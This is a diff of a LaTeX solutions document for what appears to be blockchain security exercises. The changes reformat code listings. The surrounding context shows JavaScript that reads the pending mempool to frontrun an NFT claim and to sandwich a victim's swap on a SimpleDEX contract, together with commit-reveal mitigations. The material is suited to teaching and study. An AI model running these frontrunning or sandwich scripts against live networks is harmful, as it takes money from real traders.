@@ -95,6 +95,8 @@ The solution employs the following strategy:
 \item Claim the NFT
 \end{enumerate}
 
+\noindent
+\begin{minipage}{\textwidth}
 \begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
 // See the mempool
 pendingBlock = await network.provider.send("eth_getBlockByNumber", [
@@ -122,12 +124,15 @@ const frontrunTx = {
 await player.sendTransaction(frontrunTx);
 console.log("Player sent frontrunning transaction");
 \end{minted}
+\end{minipage}
 
 \subsubsection*{Possible Mitigation}
 
 \textbf{Commit-Reveal Schemes}: Users first submit a hash of their bid (commit), and later reveal the actual bid value. This prevents frontrunning since the actual bid values aren't visible in the mempool.
 
-\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{solidity}
+\noindent
+\begin{minipage}{\textwidth}
+\begin{lstlisting}[language=Solidity]
 function commitBid(bytes32 bidHash) external {
     commitments[msg.sender] = bidHash;
 }
@@ -137,12 +142,15 @@ function revealBid(uint value, bytes32 secret) external payable {
     require(commitments[msg.sender] == commitment, "Invalid commitment");
     // Process the actual bid here
 }
-\end{minted}
+\end{lstlisting}
+\end{minipage}
 
 \section*{Solution to Task 2: Sandwich Attack on a DEX}
 
 The vulnerability stems from how Automated Market Makers (AMMs) like SimpleDEX determine prices using the constant product formula ($x \cdot y = k$). When a large swap occurs, it significantly moves the price, creating profitable opportunities for attackers who can manipulate transaction ordering. The SimpleDEX contract implements the standard AMM functionality:
 
+\noindent
+\begin{minipage}{\textwidth}
 \begin{lstlisting}[language=Solidity]
 function ethToUsdc() public payable returns (uint usdcBought) {
     // Ensure the pool has liquidity before attempting a swap
@@ -171,6 +179,7 @@ function ethToUsdc() public payable returns (uint usdcBought) {
     return usdcBought;
 }
 \end{lstlisting}
+\end{minipage}
 
 \noindent
 The sandwich attack consists of three steps:
@@ -181,6 +190,8 @@ The sandwich attack consists of three steps:
 \item \textbf{Backrun}: Sell the tokens (swap USDC back to ETH) after the victim's transaction, when the price is even higher
 \end{enumerate}
 
+\noindent
+\begin{minipage}{\textwidth}
 \begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
 // See the mempool
 const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
@@ -217,6 +228,7 @@ const backrunAmount = await usdcToken.balanceOf(player.address);
 await usdcToken.connect(player).approve(simpleDEX.target, backrunAmount);
 await simpleDEX.connect(player).usdcToEth(backrunAmount);
 \end{minted}
+\end{minipage}
 
 \subsubsection*{Possible Mitigation}
 
